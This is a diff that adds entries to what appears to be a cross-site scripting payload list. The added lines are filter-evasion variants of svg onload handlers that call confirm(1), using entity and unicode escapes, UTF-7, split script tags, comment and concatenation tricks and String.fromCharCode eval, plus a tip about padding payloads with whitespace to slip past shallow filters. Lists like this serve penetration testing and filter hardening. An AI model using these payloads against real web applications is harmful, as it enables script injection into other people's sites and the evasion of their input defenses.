@@ -16,6 +16,23 @@ JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Sty
 <svg onload="console.log`XSS executed`">
 <svg/onload=\u0063onfirm(1)>
 <svg onload=confirm`${1}`>
+
+<scr<script>ipt>document.write("asdasd")</scr<script>ipt>
+<SVG/ONLOAD=CON&#x46;IRM(1)>
+<svg/onload=\u0063%6Fn%66%69%72%6D(1)>
++ADw-svg+AD4-onload=confirm(1)+ADw-/svg+AD4-       (UTF-7)
+<svg/onload=con/*comment*/firm(1)>
+<svg/onload=\u0063on&#x0A;firm(1)
+<svg/onload=\u{63}\u{6F}\u{6E}\u{66}\u{69}\u{72}\u{6D}(1)>
+<svg/onload=\u0063\u006F\u006E\u0066\u0069\u0072\u006D(1)>
+<svg/onload=c+o+n+f+i+r+m(1)>
+<svg/onload=\u0063+on+firm(1)>
+<svg><animate onbegin=confirm(1) attributeName=x dur=1s></animate></svg>
+<svg><xss onload=\u0063onfirm(1)></xss></svg>
+
+*test start of payload with 10240 characters of whitespace to bypass shallow filters*
+
 eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59)); 
 ');confirm();//
 ');eval(String.fromCharCode(99, 111, 110, 102, 105, 114, 109, 40, 49, 41, 59));//
+
